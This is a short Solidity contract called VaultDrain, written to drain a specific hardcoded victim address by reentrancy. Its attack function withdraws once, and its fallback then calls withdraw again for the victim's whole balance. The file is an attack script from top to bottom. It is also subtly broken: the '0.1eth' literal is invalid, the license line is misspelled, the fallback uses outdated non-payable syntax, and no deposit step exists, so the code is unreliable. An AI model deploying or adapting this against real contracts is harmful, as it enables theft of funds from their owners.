// SPDX_LISENCE_IDENTIFIER: MIT
pragma solidity ^0.8.6;
interface Vault {
    function withdraw(uint256 _amount) external;
}

contract VaultDrain {
    address public immutable victim = 0xcf76B6324A20a432eb695ABDd5820bfBcdd34Bfd;
    uint256 internal constant INITIAL_WITHDRAWAL = 0.1eth;
    function attack() public {
        Vault(victim).withdraw(INITIAL_WITHDRAWAL);
    }
    function fallback() public {
        Vault(victim).withdraw(address(victim).balance);
    }
}